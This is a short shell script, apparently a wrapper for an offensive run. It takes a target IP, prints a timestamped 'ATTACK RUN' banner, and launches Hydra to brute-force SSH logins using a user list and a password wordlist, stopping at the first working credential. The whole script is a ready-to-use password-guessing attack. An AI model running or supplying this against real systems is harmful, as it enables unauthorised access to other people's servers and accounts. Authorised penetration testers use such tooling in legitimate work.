TARGET=$1
if [ -z "$TARGET" ]; then
echo "usage: $0 <target-ip>"
exit 1
fi
echo "===ATTACK RUN $(date -u +%FT%TZ) target=$TARGET ==="
hydra -L userlist.txt -P wordlist.txt ssh://$TARGET -t 1 -f
